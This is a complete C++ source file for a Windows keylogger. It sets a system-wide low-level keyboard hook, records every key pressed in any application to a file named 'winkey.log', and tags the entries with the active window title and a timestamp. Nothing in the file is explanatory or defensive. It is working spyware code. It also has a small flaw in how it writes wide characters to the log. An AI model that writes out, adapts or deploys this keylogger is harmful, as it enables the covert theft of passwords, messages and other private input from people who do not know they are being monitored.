#pragma warning(disable:4530 4668 4577)

#include <windows.h>
#include <string.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")

TCHAR wnd_title[1024] = { 0 };
TCHAR old_wnd_title[1024] = { 0 };

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT* kbd_struct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
	HANDLE hFile;
	DWORD dwPtr, dwPID, dwThreadID;

	switch (wParam) {
	case WM_KEYDOWN:
		HWND hForegroundProcess = GetForegroundWindow();
		dwThreadID = GetWindowThreadProcessId(hForegroundProcess, &dwPID);
		HKL currentLocale = GetKeyboardLayout(dwThreadID);
		WCHAR buffer[32];
		TCHAR log_title[1500];
		BYTE uKeyboardState[256] = { 0 };
		SYSTEMTIME local_time;

		GetKeyState(VK_SHIFT);
		GetKeyState(VK_MENU);
		GetKeyboardState(uKeyboardState);
		int numChars = ToUnicodeEx(kbd_struct->vkCode, kbd_struct->scanCode, uKeyboardState, buffer, 32, 0, currentLocale);
		if (numChars < 1)
			break;
		hFile = CreateFile(
			TEXT("winkey.log"),
			FILE_APPEND_DATA,
			FILE_SHARE_READ,
			NULL,
			OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
		if (hFile != INVALID_HANDLE_VALUE) {
			SetFilePointer(hFile, 0, NULL, FILE_END);

			GetWindowTextA(hForegroundProcess, wnd_title, 1024);
			if (strcmp(old_wnd_title, wnd_title) != 0) {
				GetLocalTime(&local_time);
				_snprintf_s(log_title, 1500, 1500, "\r\n[%02d.%02d.%04d %02d:%02d:%02d] - '%s'\r\n", local_time.wDay, local_time.wMonth, local_time.wYear, local_time.wHour, local_time.wMinute, local_time.wSecond, wnd_title);
				strcpy_s(old_wnd_title, _countof(wnd_title), wnd_title);
				WriteFile(
					hFile,
					log_title,
					strlen(log_title),
					&dwPtr,
					NULL);
			}

			WriteFile(
				hFile,
				buffer,
				(DWORD)numChars,
				&dwPtr,
				NULL);

			CloseHandle(hFile);
			hFile = INVALID_HANDLE_VALUE;
		}
		break;
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
{
	(void)hInstance;
	(void)hPrevInstance;
	(void)lpCmdLine;
	(void)nShowCmd;

	HHOOK kbd = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHook, 0, 0);

	MSG message;
	while (GetMessage(&message, NULL, NULL, NULL) > 0) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(kbd);

	return 0;
}